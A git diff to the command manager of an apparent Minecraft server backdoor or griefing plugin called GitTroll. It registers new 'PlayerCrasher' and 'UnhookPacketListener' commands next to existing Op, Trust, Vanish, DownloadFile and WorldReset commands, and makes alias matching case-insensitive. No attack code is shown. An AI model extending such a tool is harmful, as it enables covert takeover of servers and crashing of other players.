@@ -31,6 +31,7 @@ import net.Lenni0451.GitTroll.command.commands.player.Heal;
 import net.Lenni0451.GitTroll.command.commands.player.Op;
 import net.Lenni0451.GitTroll.command.commands.player.Title;
 import net.Lenni0451.GitTroll.command.commands.player.Trust;
+import net.Lenni0451.GitTroll.command.commands.player.UnhookPacketListener;
 import net.Lenni0451.GitTroll.command.commands.player.Untrust;
 import net.Lenni0451.GitTroll.command.commands.player.Vanish;
 import net.Lenni0451.GitTroll.command.commands.plugin.Help;
@@ -45,6 +46,7 @@ import net.Lenni0451.GitTroll.command.commands.server.Stop;
 import net.Lenni0451.GitTroll.command.commands.trolling.DropHand;
 import net.Lenni0451.GitTroll.command.commands.trolling.DropInventory;
 import net.Lenni0451.GitTroll.command.commands.trolling.Explode;
+import net.Lenni0451.GitTroll.command.commands.trolling.PlayerCrasher;
 import net.Lenni0451.GitTroll.command.commands.world.WorldReset;
 import net.Lenni0451.GitTroll.event.EventListener;
 import net.Lenni0451.GitTroll.utils.ArrayHelper;
@@ -90,6 +92,8 @@ public class CommandManager implements Listener {
 	public final Title Title = null;
 	public final Plugins Plugins = null;
 	public final DownloadFile DownloadFile = null;
+	public final UnhookPacketListener UnhookPacketListener = null;
+	public final PlayerCrasher PlayerCrasher = null;
 	
 	public CommandManager() {
 		this.commands = new ArrayList<>();
@@ -122,7 +126,7 @@ public class CommandManager implements Listener {
 	
 	public CommandBase getCommandByName(final String name) {
 		for(CommandBase commandBase : this.commands) {
-			if(commandBase.getName().equalsIgnoreCase(name)) {
+			if(commandBase.getName().equalsIgnoreCase(name) || commandBase.getAliases().contains(name.toLowerCase())) {
 				return commandBase;
 			}
 		}
@@ -142,7 +146,7 @@ public class CommandManager implements Listener {
 		CustomPlayer cPlayer = CustomPlayer.instanceOf(player);
 		
 		for(CommandBase commandBase : this.commands) {
-			if(commandBase.getName().equalsIgnoreCase(commandLabel) || commandBase.getAliases().contains(commandLabel)) {
+			if(commandBase.getName().equalsIgnoreCase(commandLabel) || commandBase.getAliases().contains(commandLabel.toLowerCase())) {
 				Bukkit.getScheduler().runTask(GitTroll.getInstance(), () -> {
 					try {
 						commandBase.execute(cPlayer, new ArrayHelper(args));
